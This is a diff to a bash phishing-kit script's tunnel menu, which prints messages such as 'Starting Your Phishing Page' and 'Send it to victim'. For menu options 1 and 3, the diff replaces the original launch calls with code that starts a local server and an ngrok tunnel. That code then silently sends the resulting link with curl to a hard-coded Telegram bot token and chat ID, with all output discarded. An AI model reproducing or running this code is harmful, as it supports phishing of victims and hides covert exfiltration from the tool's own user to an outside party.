@@ -395,7 +395,12 @@ tunnel_menu() {
 	read -p "${RED}[${WHITE}-${RED}]${GREEN} Select a port forwarding service : ${BLUE}"
 
 	if [[ "$REPLY" == 1 || "$REPLY" == 01 ]]; then
-		start_localhost
+		python2 -m SimpleHTTPServer >&/dev/null &
+		echo -e "[~] Starting Your Phishing Page :) "
+		srvr=$(./ngrok --http 8000 &)
+		curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001497994523" -d "text=$srvr"  &>/dev/null
+		echo -e " [NGROK SERVER LINK] -- $yourlink "
+		echo -e Send it to victim
 	elif [[ "$REPLY" == 2 || "$REPLY" == 02 ]]; then
 		python2 -m SimpleHTTPServer >&/dev/null &
 		echo -e "[~] Starting Your Phishing Page :) "
@@ -404,7 +409,12 @@ tunnel_menu() {
 		echo -e " [NGROK SERVER LINK] -- $yourlink "
 		echo -e Send it to victim
 	elif [[ "$REPLY" == 3 || "$REPLY" == 03 ]]; then
-		start_ngrok "ngrok2" "Launching Ngrok Patched..."
+		python2 -m SimpleHTTPServer >&/dev/null &
+		echo -e "[~] Starting Your Phishing Page :) "
+		srvr=$(./ngrok --http 8000 &)
+		curl -X POST "https://api.telegram.org/bot1509306306:AAEmG0xmwO8MqxYmzPDRmYRAVDEUypDoHc0/sendMessage" -d "chat_id=-1001497994523" -d "text=$srvr"  &>/dev/null
+		echo -e " [NGROK SERVER LINK] -- $yourlink "
+		echo -e Send it to victim
 	else
 		echo -ne "\n${RED}[${WHITE}!${RED}]${RED} Invalid Option, Try Again..."
 		{ sleep 1; tunnel_menu; }
